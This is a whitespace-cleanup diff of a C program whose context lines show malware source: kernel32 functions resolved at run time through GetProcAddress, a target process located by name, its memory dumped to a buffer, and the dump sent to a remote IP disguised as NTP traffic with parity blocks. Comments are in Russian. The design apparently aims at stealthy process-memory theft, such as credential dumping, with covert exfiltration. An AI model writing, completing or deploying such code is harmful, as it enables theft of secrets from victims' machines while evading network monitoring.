@@ -138,13 +138,13 @@ DWORD GetTargetProcessPID(const wchar_t *targetProcessName) {
     typedef BOOL   (WINAPI *pProcess32NextW)(HANDLE, LPPROCESSENTRY32W);
     typedef BOOL   (WINAPI *pCloseHandle)(HANDLE);
 
-    pCreateToolhelp32Snapshot fCreateToolhelp32Snapshot = 
+    pCreateToolhelp32Snapshot fCreateToolhelp32Snapshot =
         (pCreateToolhelp32Snapshot)GetProcAddress(hKernel32, "CreateToolhelp32Snapshot");
-    pProcess32FirstW fProcess32FirstW = 
+    pProcess32FirstW fProcess32FirstW =
         (pProcess32FirstW)GetProcAddress(hKernel32, "Process32FirstW");
-    pProcess32NextW fProcess32NextW = 
+    pProcess32NextW fProcess32NextW =
         (pProcess32NextW)GetProcAddress(hKernel32, "Process32NextW");
-    pCloseHandle fCloseHandle = 
+    pCloseHandle fCloseHandle =
         (pCloseHandle)GetProcAddress(hKernel32, "CloseHandle");
 
     if (!fCreateToolhelp32Snapshot || !fProcess32FirstW || !fProcess32NextW || !fCloseHandle) {
@@ -248,7 +248,7 @@ BOOL DumpProcessToMemory(DWORD pid, char **dumpBuffer, size_t *dumpSize) {
 
     SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
     DWORD bytesRead = 0;
-    if (!ReadFile(hFile, *dumpBuffer, (DWORD)*dumpSize, &bytesRead, NULL) 
+    if (!ReadFile(hFile, *dumpBuffer, (DWORD)*dumpSize, &bytesRead, NULL)
         || bytesRead != *dumpSize)
     {
         free(*dumpBuffer);
@@ -503,7 +503,7 @@ int SendDumpAsNTP(const char *target_ip, int target_port, const char *dumpData, 
 
         // Готовим массив для двух «байтов» фрагмента
         unsigned char data_block[BLOCK_SIZE];
-        unsigned char parity0[BLOCK_SIZE]; 
+        unsigned char parity0[BLOCK_SIZE];
         unsigned char parity1[BLOCK_SIZE];
 
         memset(parity0, 0, BLOCK_SIZE);
@@ -546,9 +546,9 @@ int SendDumpAsNTP(const char *target_ip, int target_port, const char *dumpData, 
             int fec_seq = 0x80000000 | ((block_index * BLOCK_SIZE + j) & 0x7FFFFFFF);
 
             // Собираем 16 бит fec_seq + 16 бит (parity0 << 8 | parity1)
-            uint32_t plain = 
-                (((uint32_t)fec_seq & 0xFFFF) << 16) 
-                 | 
+            uint32_t plain =
+                (((uint32_t)fec_seq & 0xFFFF) << 16)
+                 |
                 (((uint32_t)parity0[j] << 8) | parity1[j]);
 
             unsigned char plain_bytes[4];
